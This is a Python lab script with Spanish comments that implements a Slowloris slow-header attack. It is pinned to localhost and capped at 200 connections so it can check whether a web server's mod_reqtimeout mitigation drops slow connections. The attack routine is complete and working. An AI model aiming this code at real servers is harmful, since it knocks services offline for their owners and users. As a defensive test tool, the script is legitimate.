#!/usr/bin/env python3
"""Probador de Slowloris — SÓLO para este laboratorio, contra 127.0.0.1.

Herramienta didáctica del lado azul: abre varias conexiones y envía las
cabeceras HTTP muy despacio y sin terminarlas nunca. Sirve para COMPROBAR si la
mitigación (mod_reqtimeout) corta las conexiones lentas. El destino está fijado
a localhost y el número de conexiones está acotado a propósito.

Uso:
    python3 /opt/lab/slowtest.py            # 150 conexiones lentas durante ~40 s
    python3 /opt/lab/slowtest.py 80 20      # 80 conexiones durante 20 s

Lectura del resultado:
  - "vivas" se mantiene alto  -> el servidor aguanta conexiones lentas (vulnerable)
  - "vivas" cae a ~0 enseguida -> la mitigación las corta (protegido)
"""
import socket
import sys
import time

HOST = "127.0.0.1"          # fijado: este lab, en local
PORT = 80
MAX_SOCKETS = 200           # tope de seguridad del probador

n = min(int(sys.argv[1]) if len(sys.argv) > 1 else 150, MAX_SOCKETS)
duration = int(sys.argv[2]) if len(sys.argv) > 2 else 40


def open_slow():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((HOST, PORT))
    # Petición que nunca se completa: faltan la línea en blanco final.
    s.send(b"GET /?%d HTTP/1.1\r\n" % int(time.time() * 1000))
    s.send(b"Host: 127.0.0.1\r\n")
    s.send(b"User-Agent: slowtest-lab\r\n")
    return s


socks = []
for _ in range(n):
    try:
        socks.append(open_slow())
    except OSError:
        break
print("Abiertas %d conexiones lentas contra %s:%d" % (len(socks), HOST, PORT))

t0 = time.time()
while time.time() - t0 < duration:
    alive = 0
    for s in list(socks):
        try:
            s.send(b"X-a: b\r\n")   # una cabecera más, gota a gota
            alive += 1
        except OSError:
            socks.remove(s)
    print("  t=%2ds  conexiones vivas: %d" % (int(time.time() - t0), alive))
    if alive == 0:
        print("  -> el servidor cortó todas las conexiones lentas. Mitigado.")
        break
    time.sleep(5)

for s in socks:
    try:
        s.close()
    except OSError:
        pass
